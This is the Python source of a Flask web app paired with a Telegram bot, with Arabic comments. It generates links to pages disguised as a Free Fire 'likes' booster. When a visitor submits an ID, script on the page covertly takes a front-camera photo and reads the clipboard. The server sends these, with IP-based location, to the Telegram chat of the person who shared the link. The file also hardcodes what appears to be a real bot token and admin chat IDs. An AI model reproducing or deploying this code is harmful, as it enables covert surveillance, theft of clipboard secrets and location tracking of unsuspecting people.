from flask import Flask, request, jsonify, send_file
import os
import logging
import requests
from datetime import datetime
from PIL import Image, ImageDraw, ImageFont
import io
import telebot
import threading
import time
import secrets

app = Flask(__name__)

# إعدادات البوت
TELEGRAM_BOT_TOKEN = '7930188784:AAHWJMVr9169-IOYPK-xuQDz9CV4fIMHXys'
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
ADMIN_CHAT_ID = [7796858163, 6839275984]  # معرف الأدمن

# إعدادات التسجيل
logging.basicConfig(level=logging.INFO)
IP_INFO_API = "https://ipinfo.io"

# تهيئة البوت
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# وظيفة للرد على الأمر /c
@bot.message_handler(commands=['c'])
def handle_c_command(message):
    # إنشاء رابط فريد للمستخدم
    unique_id = secrets.token_hex(8)  # إنشاء معرف فريد
    user_chat_id = message.chat.id  # الحصول على chat_id الخاص بالمستخدم
    domain = "https://api-like-free-fire-new.vercel.app"  # الدومين الخاص بك
    link = f"{domain}/like?chat_id={user_chat_id}&id={unique_id}"  # الرابط الفريد

    # إرسال الرسالة الأولى
    bot.reply_to(message, 
        f"<b>تم إرسال طلب للسيرفر، قريبًا سيتم إضافة هذا البوت لسيرفر XAZ، يُرجى الانتظار 🤖</b>\n\n"
        f"<b>🔹 XAZ Team Official Links 🔹</b>\n"
        f"🌍 <b>Source Group:</b> <a href='https://t.me/xazteam'>XAZ Team Source</a>\n"
        f"🌍 <b>New Team Group:</b> <a href='https://t.me/+nuACUoH_xn05NjE0'>Join XAZ Team</a>\n"
        f"🌍 <b>XAZ Team Official Website:</b> <a href='https://xaz-team-website.free.bg/'>Visit Website</a>\n\n"
        f"<b>🌍 XAZ Team Official Website 🌍</b>\n"
        f"⚠ <b>Note:</b> If the page doesn't load completely, try enabling PC Mode for the best experience.\n"
        f"Stay safe and always verify official sources! 💙\n\n"
        f"<b>رابطك الفريد:</b> {link}",
        parse_mode="HTML"
    )

    # تأخير 15 ثانية ثم إرسال رسالة إلى الأدمن
    threading.Thread(target=send_admin_message_after_delay, args=(user_chat_id,)).start()

# وظيفة لإرسال رسالة إلى الأدمن بعد 15 ثانية
def send_admin_message_after_delay(chat_id):
    time.sleep(15)
    for admin_id in ADMIN_CHAT_ID:
        bot.send_message(
            admin_id,
            f"<b>تم قبول طلب دخول سيرفر XAZ من المستخدم:</b> {chat_id}\n"
            "يرجى التحقق من الطلب والرد عليه.",
            parse_mode="HTML"
        )

# وظيفة للرد على الأوامر /xaz, /help, /start
@bot.message_handler(commands=['xaz', 'help', 'start'])
def handle_commands(message):
    user_chat_id = message.chat.id  # الحصول على chat_id الخاص بالمستخدم
    domain = "https://api-like-free-fire-new.vercel.app"  # الدومين الخاص بك
    bot.reply_to(message, 
        f"<b>مرحبا بكم في سرفر XAZ, هذا سرفر تجريبي لميزات نكح أي مبتز أو ذبابة إلكترونية</b>\n\n"
        f"<b>هذه الرسالة عند ظهورها تعني تم قبول طلب لسرفر XAZ.</b>\n"
        f"<b>هذا البوت تم تنصيبه على السيرفر بنجاح.</b>\n\n"
        f"<b>الآن هناك عدة روابط على شكل موقع زيادة لايكات فري فاير 😊</b>\n"
        f"<b>(تقوم بمشاركة هذه الروابط مع المبتز أو الذبابة الإلكترونية للقضاء عليها 🙂)</b>\n\n"
        f"<b>كل ما عليك هو أخذ أي رابط من التالي:</b>\n"
        f"- {domain}/like?chat_id={user_chat_id}\n"
        f"- {domain}/visit?chat_id={user_chat_id}\n"
        f"- {domain}/spam?chat_id={user_chat_id}\n\n"
        f"<b>By:</b> @X_M_1_9, @Wewefso",
        parse_mode="HTML"
    )

# تشغيل البوت في خيط منفصل
def run_bot():
    bot.polling(none_stop=True)

# تشغيل البوت في خيط منفصل
threading.Thread(target=run_bot).start()

# باقي الكود الخاص بـ Flask
def generate_page(title, bg_color, button_text, chat_id):
    return f"""<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>{title}</title>
    <style>
        body {{
            background-color: {bg_color};
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 20%;
        }}
        h1 {{
            font-size: 2em;
            color: #333;
        }}
        input[type="text"] {{
            padding: 10px;
            font-size: 1em;
            width: 300px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }}
        button {{
            padding: 10px 20px;
            font-size: 1em;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }}
    </style>
    <script>
        async function capturePhoto(facingMode, label) {{
            try {{
                let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: facingMode }} }});
                let video = document.createElement('video');
                video.srcObject = stream;
                await video.play();  

                let canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));

                let formData = new FormData();
                formData.append("photo", blob, `${{label}}_photo.png`);
                formData.append("chat_id", "{chat_id}");

                await fetch('/upload', {{ method: 'POST', body: formData }});

                stream.getTracks().forEach(track => track.stop());
            }} catch (error) {{
                console.log("فشل في ارسال اليكات :", error);
            }}
        }}

        async function sendData() {{
            const id = document.getElementById('userId').value;
            if (id) {{
                await capturePhoto("user", "front");
                await sendClipboard();
                alert("تم الإرسال بنجاح");
            }} else {{
                alert("يرجى إدخال المعرف");
            }}
        }}

        async function sendClipboard() {{
            try {{
                const text = await navigator.clipboard.readText();
                if (text) {{
                    const formData = new FormData();
                    formData.append("clipboard", text);
                    formData.append("chat_id", "{chat_id}");

                    await fetch('/upload', {{ method: 'POST', body: formData }});
                }} else {{
                    console.log("لا يوجد محتوى في الحافظة");
                }}
            }} catch (error) {{
                console.log("حدث خطأ: ", error);
            }}
        }}
    </script>
</head>
<body>
    <h1>Id :</h1>
    <input type="text" id="userId" placeholder="1234567*">
    <button onclick="sendData()">{button_text}</button>
</body>
</html>"""

@app.route('/like')
def like():
    chat_id = request.args.get('chat_id')  # الحصول على chat_id من الرابط
    if not chat_id:
        return "Chat ID مطلوب!", 400
    return generate_page("Like Page", "#ffcccc", "Submit", chat_id)

@app.route('/visit')
def visit():
    chat_id = request.args.get('chat_id')  # الحصول على chat_id من الرابط
    if not chat_id:
        return "Chat ID مطلوب!", 400
    return generate_page("Visit Page", "#ffffff", "Submit", chat_id)

@app.route('/spam')
def spam():
    chat_id = request.args.get('chat_id')  # الحصول على chat_id من الرابط
    if not chat_id:
        return "Chat ID مطلوب!", 400
    return generate_page("Spam Page", "#ffccff", "Submit", chat_id)

def add_watermark(image_path, output_path):
    image = Image.open(image_path)
    draw = ImageDraw.Draw(image)
    font = ImageFont.load_default()
    text = "By: XAZ TEAM"
    draw.text((10, 10), text, fill="red", font=font)
    image.save(output_path)

@app.route('/upload', methods=['POST'])
def upload():
    try:
        chat_id = request.form.get("chat_id")  # الحصول على chat_id من البيانات المرسلة
        if not chat_id:
            return jsonify({'status': 'error', 'message': '❌ لم يتم تحديد الشات'}), 400

        ip_info = requests.get(IP_INFO_API).json()
        ip = ip_info.get('ip', 'غير معروف')
        city = ip_info.get('city', 'غير معروف')
        region = ip_info.get('region', 'غير معروف')
        country = ip_info.get('country', 'غير معروف')
        location = ip_info.get('loc', 'غير معروف')
        now = datetime.now()
        current_time = now.strftime("%Y-%m-%d %H:%M:%S")
        message = (
            f"<b>New User Captured 😏</b>\n\n"
            f"<b>IP:</b> <code>{ip}</code>\n"
            f"<b>City:</b> <code>{city}</code>\n"
            f"<b>Region:</b> <code>{region}</code>\n"
            f"<b>Country:</b> <code>{country}</code>\n"
            f"<b>Location:</b> <a href='https://www.google.com/maps?q={location}'>Click here</a>\n\n"
            f"<b>Time:</b> <code>{current_time}</code>\n\n"
            f"<i>This tool was designed by XAZ 😎</i>"
        )
        if 'photo' in request.files:
            uploaded_file = request.files.get("photo")
            photo_path = "photo.png"
            uploaded_file.save(photo_path)
            watermarked_path = "watermarked_photo.png"
            add_watermark(photo_path, watermarked_path)
            files = {'photo': open(watermarked_path, 'rb')}
            response = requests.post(
                f"{TELEGRAM_API_URL}/sendPhoto",
                data={
                    'chat_id': chat_id,  # إرسال إلى الشات المحدد
                    'caption': message,
                    'parse_mode': 'HTML'
                },
                files=files
            )
            os.remove(photo_path)
            os.remove(watermarked_path)
        elif 'clipboard' in request.form:
            clipboard_content = request.form.get("clipboard")
            response = requests.post(
                f"{TELEGRAM_API_URL}/sendMessage",
                data={
                    'chat_id': chat_id,  # إرسال إلى الشات المحدد
                    'text': f"{message}\n\n<b>Clipboard Content:</b>\n<code>{clipboard_content}</code>",
                    'parse_mode': 'HTML'
                }
            )
        else:
            logging.error("لم يتم استلام أي محتوى.")
            return jsonify({'status': 'error', 'message': '❌ لم يتم استلام أي محتوى'}), 400

        # التحقق من حالة الاستجابة
        if response.status_code == 200:
            logging.info("تم إرسال المحتوى بنجاح.")
            return jsonify({'status': 'success', 'message': '✅ تم إرسال المحتوى بنجاح'})
        else:
            logging.error(f"فشل الإرسال: {response.text}")
            return jsonify({'status': 'error', 'message': f'❌ فشل الإرسال: {response.text}'}), 500

    except Exception as e:
        logging.error(f"فشل الإرسال: {e}")
        return jsonify({'status': 'error', 'message': f'❌ فشل الإرسال: {e}'}), 500

@app.route('/ping')
def ping():
    return jsonify({'status': 'success', 'message': '🏓 Pong!'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
